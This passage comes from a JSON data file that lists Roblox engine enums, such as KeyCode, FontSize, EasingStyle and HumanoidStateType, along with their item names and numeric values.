ype":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"ComputerMovementMode"},{"type":"Enum","Name":"ConcurrencyModel","tags":[]},{"type":"EnumItem","Name":"Serial","tags":[],"Value":0,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Safe","tags":[],"Value":1,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Logical","tags":[],"Value":2,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Empirical","tags":[],"Value":3,"Enum":"ConcurrencyModel"},{"type":"Enum","Name":"ControlMode","tags":[]},{"type":"EnumItem","Name":"MouseLockSwitch","tags":[],"Value":1,"Enum":"ControlMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ControlMode"},{"type":"Enum","Name":"CoreGuiType","tags":[]},{"type":"EnumItem","Name":"PlayerList","tags":[],"Value":0,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Health","tags":[],"Value":1,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Backpack","tags":[],"Value":2,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Chat","tags":[],"Value":3,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"All","tags":[],"Value":4,"Enum":"CoreGuiType"},{"type":"Enum","Name":"CreatorType","tags":[]},{"type":"EnumItem","Name":"User","tags":[],"Value":0,"Enum":"CreatorType"},{"type":"EnumItem","Name":"Group","tags":[],"Value":1,"Enum":"CreatorType"},{"type":"Enum","Name":"CurrencyType","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Robux","tags":[],"Value":1,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Tix","tags":[],"Value":2,"Enum":"CurrencyType"},{"type":"Enum","Name":"CustomCameraMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"CustomCameraMode"},{"type":"Enum","Name":"DevCameraOcclusionMode","tags":[]},{"type":"EnumItem","Name":"Zoom","tags":[],"Value":0,"Enum":"DevCameraOcclusionMode"},{"type":"EnumItem","Name":"Invisicam","tags":[],"Value":1,"Enum":"DevCameraOcclusionMode"},{"type":"Enum","Name":"DevComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevComputerCameraMovementMode"},{"type":"Enum","Name":"DevComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":3,"Enum":"DevComputerMovementMode"},{"type":"Enum","Name":"DevTouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevTouchCameraMovementMode"},{"type":"Enum","Name":"DevTouchMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":5,"Enum":"DevTouchMovementMode"},{"type":"Enum","Name":"DialogPurpose","tags":[]},{"type":"EnumItem","Name":"Quest","tags":[],"Value":0,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Help","tags":[],"Value":1,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Shop","tags":[],"Value":2,"Enum":"DialogPurpose"},{"type":"Enum","Name":"DialogTone","tags":[]},{"type":"EnumItem","Name":"Neutral","tags":[],"Value":0,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Friendly","tags":[],"Value":1,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Enemy","tags":[],"Value":2,"Enum":"DialogTone"},{"type":"Enum","Name":"EasingDirection","tags":[]},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"EasingDirection"},{"type":"Enum","Name":"EasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Sine","tags":[],"Value":1,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quad","tags":[],"Value":3,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quart","tags":[],"Value":4,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quint","tags":[],"Value":5,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":6,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":7,"Enum":"EasingStyle"},{"type":"Enum","Name":"EnviromentalPhysicsThrottle","tags":[]},{"type":"EnumItem","Name":"DefaultAuto","tags":[],"Value":0,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Disabled","tags":[],"Value":1,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip2","tags":[],"Value":3,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip4","tags":[],"Value":4,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip8","tags":[],"Value":5,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip16","tags":[],"Value":6,"Enum":"EnviromentalPhysicsThrottle"},{"type":"Enum","Name":"ErrorReporting","tags":[]},{"type":"EnumItem","Name":"DontReport","tags":[],"Value":0,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Prompt","tags":[],"Value":1,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Report","tags":[],"Value":2,"Enum":"ErrorReporting"},{"type":"Enum","Name":"ExplosionType","tags":[]},{"type":"EnumItem","Name":"NoCraters","tags":[],"Value":0,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"Craters","tags":[],"Value":1,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"CratersAndDebris","tags":[],"Value":2,"Enum":"ExplosionType"},{"type":"Enum","Name":"FilterResult","tags":[]},{"type":"EnumItem","Name":"Rejected","tags":[],"Value":1,"Enum":"FilterResult"},{"type":"EnumItem","Name":"Accepted","tags":[],"Value":0,"Enum":"FilterResult"},{"type":"Enum","Name":"Font","tags":[]},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"Font"},{"type":"EnumItem","Name":"Arial","tags":[],"Value":1,"Enum":"Font"},{"type":"EnumItem","Name":"ArialBold","tags":[],"Value":2,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSans","tags":[],"Value":3,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansBold","tags":[],"Value":4,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansLight","tags":[],"Value":5,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansItalic","tags":[],"Value":6,"Enum":"Font"},{"type":"Enum","Name":"FontSize","tags":[]},{"type":"EnumItem","Name":"Size8","tags":[],"Value":0,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size9","tags":[],"Value":1,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size10","tags":[],"Value":2,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size11","tags":[],"Value":3,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size12","tags":[],"Value":4,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size14","tags":[],"Value":5,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size18","tags":[],"Value":6,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size24","tags":[],"Value":7,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size36","tags":[],"Value":8,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size48","tags":[],"Value":9,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size28","tags":[],"Value":10,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size32","tags":[],"Value":11,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size42","tags":[],"Value":12,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size60","tags":[],"Value":13,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size96","tags":[],"Value":14,"Enum":"FontSize"},{"type":"Enum","Name":"FormFactor","tags":[]},{"type":"EnumItem","Name":"Symmetric","tags":[],"Value":0,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":1,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Plate","tags":[],"Value":2,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":3,"Enum":"FormFactor"},{"type":"Enum","Name":"FrameStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatBlue","tags":[],"Value":1,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxSquare","tags":[],"Value":2,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxRound","tags":[],"Value":3,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatGreen","tags":[],"Value":4,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatRed","tags":[],"Value":5,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"DropShadow","tags":[],"Value":6,"Enum":"FrameStyle"},{"type":"Enum","Name":"FramerateManagerMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"FramerateManagerMode"},{"type":"Enum","Name":"FriendRequestEvent","tags":[]},{"type":"EnumItem","Name":"Issue","tags":[],"Value":0,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Revoke","tags":[],"Value":1,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Accept","tags":[],"Value":2,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Deny","tags":[],"Value":3,"Enum":"FriendRequestEvent"},{"type":"Enum","Name":"FriendStatus","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"NotFriend","tags":[],"Value":1,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"Friend","tags":[],"Value":2,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestSent","tags":[],"Value":3,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestReceived","tags":[],"Value":4,"Enum":"FriendStatus"},{"type":"Enum","Name":"FunctionalTestResult","tags":[]},{"type":"EnumItem","Name":"Passed","tags":[],"Value":0,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Warning","tags":[],"Value":1,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Error","tags":[],"Value":2,"Enum":"FunctionalTestResult"},{"type":"Enum","Name":"GearGenreSetting","tags":[]},{"type":"EnumItem","Name":"AllGenres","tags":[],"Value":0,"Enum":"GearGenreSetting"},{"type":"EnumItem","Name":"MatchingGenreOnly","tags":[],"Value":1,"Enum":"GearGenreSetting"},{"type":"Enum","Name":"GearType","tags":[]},{"type":"EnumItem","Name":"MeleeWeapons","tags":[],"Value":0,"Enum":"GearType"},{"type":"EnumItem","Name":"RangedWeapons","tags":[],"Value":1,"Enum":"GearType"},{"type":"EnumItem","Name":"Explosives","tags":[],"Value":2,"Enum":"GearType"},{"type":"EnumItem","Name":"PowerUps","tags":[],"Value":3,"Enum":"GearType"},{"type":"EnumItem","Name":"NavigationEnhancers","tags":[],"Value":4,"Enum":"GearType"},{"type":"EnumItem","Name":"MusicalInstruments","tags":[],"Value":5,"Enum":"GearType"},{"type":"EnumItem","Name":"SocialItems","tags":[],"Value":6,"Enum":"GearType"},{"type":"EnumItem","Name":"BuildingTools","tags":[],"Value":7,"Enum":"GearType"},{"type":"EnumItem","Name":"Transport","tags":[],"Value":8,"Enum":"GearType"},{"type":"Enum","Name":"Genre","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"Genre"},{"type":"EnumItem","Name":"TownAndCity","tags":[],"Value":1,"Enum":"Genre"},{"type":"EnumItem","Name":"Fantasy","tags":[],"Value":2,"Enum":"Genre"},{"type":"EnumItem","Name":"SciFi","tags":[],"Value":3,"Enum":"Genre"},{"type":"EnumItem","Name":"Ninja","tags":[],"Value":4,"Enum":"Genre"},{"type":"EnumItem","Name":"Scary","tags":[],"Value":5,"Enum":"Genre"},{"type":"EnumItem","Name":"Pirate","tags":[],"Value":6,"Enum":"Genre"},{"type":"EnumItem","Name":"Adventure","tags":[],"Value":7,"Enum":"Genre"},{"type":"EnumItem","Name":"Sports","tags":[],"Value":8,"Enum":"Genre"},{"type":"EnumItem","Name":"Funny","tags":[],"Value":9,"Enum":"Genre"},{"type":"EnumItem","Name":"WildWest","tags":[],"Value":10,"Enum":"Genre"},{"type":"EnumItem","Name":"War","tags":[],"Value":11,"Enum":"Genre"},{"type":"EnumItem","Name":"SkatePark","tags":[],"Value":12,"Enum":"Genre"},{"type":"EnumItem","Name":"Tutorial","tags":[],"Value":13,"Enum":"Genre"},{"type":"Enum","Name":"GraphicsMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":1,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D9","tags":[],"Value":3,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D11","tags":[],"Value":2,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"OpenGL","tags":[],"Value":4,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"NoGraphics","tags":[],"Value":5,"Enum":"GraphicsMode"},{"type":"Enum","Name":"HandlesStyle","tags":[]},{"type":"EnumItem","Name":"Resize","tags":[],"Value":0,"Enum":"HandlesStyle"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"HandlesStyle"},{"type":"Enum","Name":"HttpContentType","tags":[]},{"type":"EnumItem","Name":"ApplicationJson","tags":[],"Value":0,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationXml","tags":[],"Value":1,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationUrlEncoded","tags":[],"Value":2,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextPlain","tags":[],"Value":3,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextXml","tags":[],"Value":4,"Enum":"HttpContentType"},{"type":"Enum","Name":"HumanoidDisplayDistanceType","tags":[]},{"type":"EnumItem","Name":"Viewer","tags":[],"Value":0,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"Subject","tags":[],"Value":1,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"HumanoidDisplayDistanceType"},{"type":"Enum","Name":"HumanoidRigType","tags":[]},{"type":"EnumItem","Name":"R6","tags":[],"Value":0,"Enum":"HumanoidRigType"},{"type":"EnumItem","Name":"R15","tags":[],"Value":1,"Enum":"HumanoidRigType"},{"type":"Enum","Name":"HumanoidStateType","tags":[]},{"type":"EnumItem","Name":"FallingDown","tags":[],"Value":0,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Running","tags":[],"Value":8,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"RunningNoPhysics","tags":[],"Value":10,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Climbing","tags":[],"Value":12,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"StrafingNoPhysics","tags":[],"Value":11,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Ragdoll","tags":[],"Value":1,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"GettingUp","tags":[],"Value":2,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Jumping","tags":[],"Value":3,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Landed","tags":[],"Value":7,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Flying","tags":[],"Value":6,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Freefall","tags":[],"Value":5,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Seated","tags":[],"Value":13,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"PlatformStanding","tags":[],"Value":14,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Dead","tags":[],"Value":15,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Swimming","tags":[],"Value":4,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Physics","tags":[],"Value":16,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"None","tags":[],"Value":18,"Enum":"HumanoidStateType"},{"type":"Enum","Name":"InOut","tags":[]},{"type":"EnumItem","Name":"Edge","tags":[],"Value":0,"Enum":"InOut"},{"type":"EnumItem","Name":"Inset","tags":[],"Value":1,"Enum":"InOut"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"InOut"},{"type":"Enum","Name":"InfoType","tags":[]},{"type":"EnumItem","Name":"Asset","tags":[],"Value":0,"Enum":"InfoType"},{"type":"EnumItem","Name":"Product","tags":[],"Value":1,"Enum":"InfoType"},{"type":"Enum","Name":"InputType","tags":[]},{"type":"EnumItem","Name":"NoInput","tags":[],"Value":0,"Enum":"InputType"},{"type":"EnumItem","Name":"LeftTread","tags":[],"Value":1,"Enum":"InputType"},{"type":"EnumItem","Name":"RightTread","tags":[],"Value":2,"Enum":"InputType"},{"type":"EnumItem","Name":"Steer","tags":[],"Value":3,"Enum":"InputType"},{"type":"EnumItem","Name":"Throtle","tags":[],"Value":4,"Enum":"InputType"},{"type":"EnumItem","Name":"UpDown","tags":[],"Value":6,"Enum":"InputType"},{"type":"EnumItem","Name":"Action1","tags":[],"Value":7,"Enum":"InputType"},{"type":"EnumItem","Name":"Action2","tags":[],"Value":8,"Enum":"InputType"},{"type":"EnumItem","Name":"Action3","tags":[],"Value":9,"Enum":"InputType"},{"type":"EnumItem","Name":"Action4","tags":[],"Value":10,"Enum":"InputType"},{"type":"EnumItem","Name":"Action5","tags":[],"Value":11,"Enum":"InputType"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":12,"Enum":"InputType"},{"type":"EnumItem","Name":"Sin","tags":[],"Value":13,"Enum":"InputType"},{"type":"Enum","Name":"JointCreationMode","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"Surface","tags":[],"Value":1,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"JointCreationMode"},{"type":"Enum","Name":"JointType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":22,"Enum":"JointType"},{"type":"EnumItem","Name":"Rotate","tags":[],"Value":6,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateP","tags":[],"Value":7,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateV","tags":[],"Value":8,"Enum":"JointType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":9,"Enum":"JointType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":1,"Enum":"JointType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":3,"Enum":"JointType"},{"type":"Enum","Name":"KeyCode","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backspace","tags":[],"Value":8,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tab","tags":[],"Value":9,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Clear","tags":[],"Value":12,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Return","tags":[],"Value":13,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":19,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Escape","tags":[],"Value":27,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Space","tags":[],"Value":32,"Enum":"KeyCode"},{"type":"EnumItem","Name":"QuotedDouble","tags":[],"Value":34,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Hash","tags":[],"Value":35,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Dollar","tags":[],"Value":36,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Percent","tags":[],"Value":37,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Ampersand","tags":[],"Value":38,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Quote","tags":[],"Value":39,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftParenthesis","tags":[],"Value":40,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightParenthesis","tags":[],"Value":41,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Asterisk","tags":[],"Value":42,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Plus","tags":[],"Value":43,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Comma","tags":[],"Value":44,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Minus","tags":[],"Value":45,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Period","tags":[],"Value":46,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Slash","tags":[],"Value":47,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Zero","tags":[],"Value":48,"Enum":"KeyCode"},{"type":"EnumItem","Name":"One","tags":[],"Value":49,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Two","tags":[],"Value":50,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Three","tags":[],"Value":51,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Four","tags":[],"Value":52,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Five","tags":[],"Value":53,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Six","tags":[],"Value":54,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Seven","tags":[],"Value":55,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Eight","tags":[],"Value":56,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Nine","tags":[],"Value":57,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Colon","tags":[],"Value":58,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Semicolon","tags":[],"Value":59,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LessThan","tags":[],"Value":60,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Equals","tags":[],"Value":61,"Enum":"KeyCode"},{"type":"EnumItem","Name":"GreaterThan","tags":[],"Value":62,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Question","tags":[],"Value":63,"Enum":"KeyCode"},{"type":"EnumItem","Name":"At","tags":[],"Value":64,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftBracket","tags":[],"Value":91,"Enum":"KeyCode"},{"type":"EnumItem","Name":"BackSlash","tags":[],"Value":92,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightBracket","tags":[],"Value":93,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Caret","tags":[],"Value":94,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Underscore","tags":[],"Value":95,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backquote","tags":[],"Value":96,"Enum":"KeyCode"},{"type":"EnumItem","Name":"A","tags":[],"Value":97,"Enum":"KeyCode"},{"type":"EnumItem","Name":"B","tags":[],"Value":98,"Enum":"KeyCode"},{"type":"EnumItem","Name":"C","tags":[],"Value":99,"Enum":"KeyCode"},{"type":"EnumItem","Name":"D","tags":[],"Value":100,"Enum":"KeyCode"},{"type":"EnumItem","Name":"E","tags":[],"Value":101,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F","tags":[],"Value":102,"Enum":"KeyCode"},{"type":"EnumItem","Name":"G","tags":[],"Value":103,"Enum":"KeyCode"},{"type":"EnumItem","Name":"H","tags":[],"Value":104,"Enum":"KeyCode"},{"type":"EnumItem","Name":"I","tags":[],"Value":105,"Enum":"KeyCode"},{"type":"EnumItem","Name":"J","tags":[],"Value":106,"Enum":"KeyCode"},{"type":"EnumItem","Name":"K","tags":[],"Value":107,"Enum":"KeyCode"},{"type":"EnumItem","Name":"L","tags":[],"Value":108,"Enum":"KeyCode"},{"type":"EnumItem","Name":"M","tags":[],"Value":109,"Enum":"KeyCode"},{"type":"EnumItem","Name":"N","tags":[],"Value":110,"Enum":"KeyCode"},{"type":"EnumItem","Name":"O","tags":[],"Value":111,"Enum":"KeyCode"},{"type":"EnumItem","Name":"P","tags":[],"Value":112,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Q","tags":[],"Value":113,"Enum":"KeyCode"},{"type":"EnumItem","Name":"R","tags":[],"Value":114,"Enum":"KeyCode"},{"type":"EnumItem","Name":"S","tags":[],"Value":115,"Enum":"KeyCode"},{"type":"EnumItem","Name":"T","tags":[],"Value":116,"Enum":"KeyCode"},{"type":"EnumItem","Name":"U","tags":[],"Value":117,"Enum":"KeyCode"},{"type":"EnumItem","Name":"V","tags":[],"Value":118,"Enum":"KeyCode"},{"type":"EnumItem","Name":"W","tags":[],"Value":119,"Enum":"KeyCode"},{"type":"EnumItem","Name":"X","tags":[],"Value":120,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Y","tags":[],"Value":121,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Z","tags":[],"Value":122,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftCurly","tags":[],"Value":123,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pipe","tags":[],"Value":124,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightCurly","tags":[],"Value":125,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tilde","tags":[],"Value":126,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Delete","tags":[],"Value":127,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadZero","tags":[],"Value":256,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadOne","tags":[],"Value":257,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadTwo","tags":[],"Value":258,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadThree","tags":[],"Value":259,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFour","tags":[],"Value":260,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFive","tags":[],"Value":261,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSix","tags":[],"Value":262,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSeven","tags":[],"Value":263,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEight","tags":[],"Value":264,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadNine","tags":[],"Value":265,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPeriod","tags":[],"Value":266,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadDivide","tags":[],"Value":267,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMultiply","tags":[],"Value":268,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMinus","tags":[],"Value":269,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPlus","tags":[],"Value":270,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEnter","tags":[],"Value":271,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEquals","tags":[],"Value":272,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Up","tags":[],"Value":273,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Down","tags":[],"Value":274,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Right","tags":[],"Value":275,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Left","tags":[],"Value":276,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Insert","tags":[],"Value":277,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Home","tags":[],"Value":278,"Enum":"KeyCode"},{"type":"EnumItem","Name":"End","tags":[],"Value":279,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":280,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":281,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftShift","tags":[],"Value":304,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightShift","tags":[],"Value":303,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftMeta","tags":[],"Value":310,"Enum":"KeyCode"},{